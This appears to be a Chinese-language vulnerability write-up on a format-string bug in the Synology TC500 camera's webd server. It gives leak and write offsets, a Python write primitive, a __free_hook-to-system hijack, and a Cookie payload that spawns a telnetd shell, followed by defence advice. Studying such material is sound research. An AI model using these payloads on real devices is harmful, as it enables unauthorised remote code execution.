---
id: binary-pwn-format-string-synology-tc500-webd-http-version-leak-freehook-rce
title: Synology TC500 webd 格式字符串：改 HTTP 版本指针泄露内存 + 持久栈指针链任意读写 + __free_hook 劫持 RCE
type: scenario
domain: binary
path: binary/pwn/format-string
technique: synology-tc500-webd-format-string-freehook-rce
aliases:
- Synology TC500 format string
- webd 格式字符串
- civetweb set_thread_name 格式化字符串
- HTTP 版本指针信息泄露
- __free_hook system RCE
- TC500 Pwn2Own
tags:
- pwn
- format-string
- iot
- synology
- arm
- civetweb
- free-hook
- info-leak
- arbitrary-write
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
affected_versions: 1.1.1_0383
verification:
  verified_by: verifier-V203
  verified_at: '2026-11-07T02:17:38+08:00'
  notes: '已对照原文核对：set_thread_name 把 req_uri 当 mg_snprintf 格式串、栈第 7 参数指向 HTTP 版本(''1.1'')、%*<idx>$c%7$n 改指针任意读、p1(栈偏移3664)/p2(0x10)/p3(2080) 跨请求持久任意写、__free_hook->system、Cookie: telnetd... 触发 free；affected_versions=1.1.1_0383 与原文固件名 Synology_TC500_1.1.1_0383.sa.bin 一致。已把''root shell''改为''webd 进程身份 shell''（原文未声明 root）。未验证点：未复跑目标固件；PoC 需按实际栈偏移调整；frontmatter 无 sources/source_url。'
---

## 一句话结论

Synology TC500 的 `webd`（定制 CivetWeb）在 `set_thread_name` 中把请求 URI 直接当作 `mg_snprintf` 的格式串，形成格式字符串漏洞；虽然线程名不会返回给远程用户，但栈上第 7 个参数恰好指向 HTTP 版本字符串 `"1.1"`，用 `%*<idx>$c%7$n` 把该指针改成目标地址后，服务器会把目标地址内容作为 HTTP 版本返回，实现任意读；再借跨请求持久的栈指针 p1→p2→p3 链实现任意写，泄露 PIE/GOT/libc 后把 glibc 2.30 的 `__free_hook` 覆写为 `system`，最后发送 `Cookie: telnetd -p 1337 -l /bin/sh -F; AAAAAAA` 让被 free 的 cookie 字符串执行命令，获得 shell（以 webd 进程身份执行）。

## 原理

- **漏洞入口**：`process_new_connection` 末尾用 `mg_snprintf(..., thread_name, 0x80, "%s%s", ..., req_uri)` 把 URI 拼进线程名，随后调用 `set_thread_name(pthread_self(), thread_name)`；`set_thread_name` 内又执行 `mg_snprintf(0, nullptr, worker_debug_table[i]->name, 0x80, thread_name)`，把线程名本身当成格式串，`req_uri` 中的 `%x`、`%n` 被求值。
- **信息泄露**：调试线程名不返回给客户端，但栈上第 7 个参数是指向 HTTP 版本字符串（`0x312e31` = `"1.1"`）的指针。`%*[idx]$c` 从指定栈参数取宽度，`%7$n` 把已输出字符数写到第 7 个参数指向的位置，即改写这个“HTTP 版本指针”的低位。之后服务器生成响应时使用被改写的指针作为版本字符串，客户端就能读到该地址的内容；反复改写即可逐字节/逐地址读取，绕过 ASLR。
- **限制**：在特定 32 位 ARM/glibc 下，单次 `%n` 写入长度不能超过约 `0x60000000`，因此只能把指针改到 `0x50000000-0x60000000` 区间；需要挑选落在该区间的目标或分步改写。
- **任意写**：格式串可写成 `%[value]c%[stack_index]$n`，用 `%n/%hn/%hhn` 分别写 4/2/1 字节。栈偏移 3664 处有指向栈自身的指针 p1；p1 指向 p2（栈偏移 0x10），p2 又指向栈偏移 2080 的闲置区 p3。这些指针在工作线程栈中埋得很深，改动会跨请求持久化：先用 `%hhn` 改 p1 的低字节，使 p2 指向 p3；再逐字节改 p2，把 p3 写成任意地址；最后按 p3 的栈索引用同样的 `%hhn` 向目标地址写。
- **任意读**：把信息泄露用的 HTTP 版本指针改成任意地址，发送请求即可返回该地址内容；与任意写组合可读 GOT、libc 等。
- **RCE**：glibc 2.30 仍使用 `__free_hook`。泄露 PIE 基址与 `free@got` 后推算 libc 基址和 `__free_hook` 地址，任意写把 `__free_hook` 覆写为 `system`；`GetSessionIdFromCookie` 会用 `std::string` 构造并拆分 `Cookie` 头，分号前的部分随后被 `operator delete` 释放，于是 `free(cookie_prefix)` 实际调用 `system(cookie_prefix)`。发送 `Cookie: telnetd -p 1337 -l /bin/sh -F; AAAAAAA` 即执行 telnetd 反弹 shell。

## 触发条件

- 目标为 Synology TC500 摄像头，运行受影响固件（文章测试 `1.1.1_0383`）。
- 攻击者可访问 `webd` 的 HTTP 端口（80/443），LAN 侧即可。
- `worker_debug_table` 已初始化（正常运行时存在）；`webd` 为 32 位 ARM、glibc 2.30、启用 PIE/Canary/NX/RELRO。

## 利用步骤

1. 解包并仿真固件，运行 `qemu-arm -L ./ ./bin/webd`，确认 HTTP 服务可访问。
2. 发送 `GET /%xAAAA...`，观察服务端日志出现 `truncating vsnprintf buffer: [127.0.0.1/1c5941f00...]`，确认 `%x` 被求值。
3. 用调试器查看 `mg_snprintf` 调用处栈布局，确认第 7 个参数指向 HTTP 版本字符串；构造 `%*<idx>$c%7$n` 改写该指针，读取目标地址内容，完成信息泄露与任意读。
4. 定位 p1（栈偏移 3664）、p2（偏移 0x10）、p3（偏移 2080），实现跨请求持久的栈指针链与 `arb_write8`。
5. 泄露 PIE 基址、`free@got`，推算 libc 基址与 `__free_hook`；把 `__free_hook` 写成 `system`。
6. 发送带 `Cookie: telnetd -p 1337 -l /bin/sh -F; AAAAAAA` 的请求，触发 free 路径执行 system，连接 1337 端口拿 shell。

## PoC

格式化字符串写原语：

```python
def stack_write8(offset, value):
    entry = offset // 4
    if len(CLIENT_IP) + 1 > value:
        value += 0x100
    req = b'GET /%' + str(value - len(CLIENT_IP) - 1).encode() + b'c%' + \
          str(entry).encode() + b'$hhn HTTP/1.1\r\n\r\n'
    do_request(req)

def arb_write8(addr, value):
    stack_write8(p1, 0x90)          # p1 -> p3
    stack_write8(p2, addr & 0xFF)   # p3 = addr 低字节
    stack_write8(p1, 0x91)
    stack_write8(p2, (addr >> 8) & 0xFF)
    stack_write8(p1, 0x92)
    stack_write8(p2, (addr >> 16) & 0xFF)
    stack_write8(p1, 0x93)
    stack_write8(p2, (addr >> 24) & 0xFF)
    # 再按 OFFSET_STACK_DATA 的栈索引向 p3 写入 value
```

信息泄露/写入格式示例：`%*3$c%7$n`（`%*3$c` 取第 3 个参数作宽度，`%7$n` 写到第 7 个参数指向的地址）。

最终命令：

```
Cookie: telnetd -p 1337 -l /bin/sh -F; AAAAAAA
```

## 变体与关联

- 用 `%hn`/`%hhn` 控制写入宽度；写入量受 `~0x60000000` 限制时选低地址目标或分步写。
- 若目标 glibc 版本仍保留 `__malloc_hook`/`__free_hook`，可换成对应 hook + one_gadget；新版 glibc 需改用其他劫持点。
- 同类格式字符串链：非栈上格式串的两级指针链覆写 GOT、栈指针链改返回地址、`__malloc_hook` one_gadget；本链的特点是“HTTP 版本指针泄露 + 跨请求持久栈指针”。
- 固件解包与仿真见 Synology `.sa.bin` construct/UBI/QEMU user-mode 流程。

## 检测与防御

- 修复根因：`mg_snprintf` 必须使用固定格式串（如 `"%s"`），绝不能把 URI/线程名当格式串。
- 升级到修复后的 TC500 固件；限制 `webd` 的 LAN 暴露面，禁止不可信网络访问管理端口。
- 对请求 URI 中的 `%` 格式化序列做检测/告警；开启编译期 `-Wformat-security`、使用 `%s` 包装、启用 FORTIFY。
- PIE/Canary/ASLR 不能替代格式串修复；对 `__free_hook` 等敏感函数指针做完整性监控。
